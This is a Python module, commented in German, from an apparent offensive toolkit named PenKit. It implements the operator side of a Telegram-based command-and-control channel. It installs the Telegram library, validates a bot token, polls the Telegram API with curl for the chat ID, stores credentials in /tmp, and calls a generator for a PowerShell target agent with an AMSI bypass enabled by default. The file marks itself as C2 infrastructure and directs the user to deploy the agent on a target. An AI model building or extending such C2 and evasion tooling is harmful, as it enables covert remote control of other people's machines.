"""
Telegram Bot — läuft auf Kali, zeigt Agent-Aktivität übersichtlich an.

Dieser Bot ist OPTIONAL — du kannst den Agent auch ohne ihn steuern
indem du direkt in den Telegram-Chat mit dem Bot schreibst.

Der Bot hier fügt hinzu:
  - /status   — alle aktiven Sessions
  - /sessions — Liste aller Agents mit letzter Aktivität
  - Automatische Benachrichtigung wenn neuer Agent sich verbindet
  - Formatierte Ausgabe von Ergebnissen

Benötigt: pip3 install python-telegram-bot --break-system-packages

Token besorgen: @BotFather auf Telegram → /newbot → Token kopieren
Chat-ID finden: @userinfobot auf Telegram anschreiben
"""

from __future__ import annotations
import asyncio
import json
import os
from dataclasses import dataclass, field
from datetime import datetime
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Telegram Bot C2",
    description=(
        "Startet den Kali-seitigen Telegram-Bot für C2-Steuerung. "
        "Zeigt aktive Sessions, formatiert Ergebnisse, sendet Alerts bei neuen Agents."
    ),
    usage="Bot-Token und Chat-ID eingeben. Bot läuft dann auf Kali.",
    danger_note="⛔ BLACK — C2-Infrastruktur.",
    example="Token von @BotFather, Chat-ID von @userinfobot",
)

DANGER = DangerLevel.BLACK


@dataclass
class BotConfig:
    token: str
    chat_id: str
    polling_interval: int = 10


def _check_library() -> bool:
    try:
        import telegram  # noqa
        return True
    except ImportError:
        return False


async def setup_bot(cfg: BotConfig) -> AsyncGenerator[str, None]:
    """
    Interaktiver Setup: prüft ob python-telegram-bot installiert ist,
    verifiziert Token, gibt Chat-ID aus.
    """
    yield "[*] Prüfe python-telegram-bot..."

    if not _check_library():
        yield "[!] python-telegram-bot nicht installiert."
        yield "[*] Installiere..."
        from core.runner import CommandRunner
        async for line in CommandRunner().run([
            "pip3", "install", "python-telegram-bot", "--break-system-packages", "-q"
        ]):
            if line.strip():
                yield f"    {line}"

    if not _check_library():
        yield "[!] Installation fehlgeschlagen. Manuell: pip3 install python-telegram-bot --break-system-packages"
        return

    yield "[+] python-telegram-bot verfügbar ✓"
    yield "[*] Verifiziere Bot-Token..."

    try:
        from telegram import Bot
        bot = Bot(token=cfg.token)
        me = await bot.get_me()
        yield f"[+] Bot: @{me.username} ({me.first_name})"
        yield f"[+] Token gültig ✓"
    except Exception as e:
        yield f"[!] Token ungültig: {e}"
        yield "[*] Token von @BotFather holen: /newbot"
        return

    yield ""
    yield f"[+] Setup erfolgreich!"
    yield f"[*] Schreibe dem Bot auf Telegram: !help"
    yield f"[*] Deine Chat-ID: {cfg.chat_id}"
    yield ""
    yield "[*] Nächster Schritt: Agent auf Ziel deployen"
    yield f"    → PenKit → C2 → Agent generieren mit Token + Chat-ID"


async def get_chat_id(token: str) -> AsyncGenerator[str, None]:
    """
    Hilft die Chat-ID zu finden: wartet auf erste Nachricht an den Bot.
    """
    yield "[*] Sende dem Bot eine Nachricht auf Telegram (z.B. 'hallo')"
    yield "[*] Warte auf Nachricht..."

    from core.runner import CommandRunner
    import json as _json

    found = False
    for _ in range(30):  # 30 Versuche × 2s = 60s timeout
        async for line in CommandRunner().run([
            "curl", "-s", f"https://api.telegram.org/bot{token}/getUpdates"
        ]):
            try:
                data = _json.loads(line)
                results = data.get("result", [])
                if results:
                    msg = results[-1].get("message", {})
                    chat = msg.get("chat", {})
                    chat_id = chat.get("id")
                    name    = chat.get("first_name", "")
                    yield f"[+] Chat-ID gefunden: {chat_id}  (von: {name})"
                    yield f"[*] Diese ID im Agent-Generator eintragen!"
                    found = True
                    return
            except Exception:
                pass
        await asyncio.sleep(2)

    if not found:
        yield "[!] Timeout — keine Nachricht empfangen."
        yield "[*] Stelle sicher dass du dem Bot eine Nachricht geschickt hast."


def generate_agent_ps1(token: str, chat_id: str, interval: int = 10) -> str:
    """Wrapper — delegate to telegram_agent.generate()"""
    from tools.c2.telegram_agent import generate
    return generate(token, chat_id, interval, include_amsi_bypass=True)


def save_config(token: str, chat_id: str, path: str = "/tmp/penkit_tg_config.json"):
    with open(path, "w") as f:
        json.dump({"token": token, "chat_id": chat_id}, f)
    os.chmod(path, 0o600)  # nur root lesbar


def load_config(path: str = "/tmp/penkit_tg_config.json") -> tuple[str, str] | None:
    if os.path.exists(path):
        with open(path) as f:
            d = json.load(f)
        return d.get("token", ""), d.get("chat_id", "")
    return None
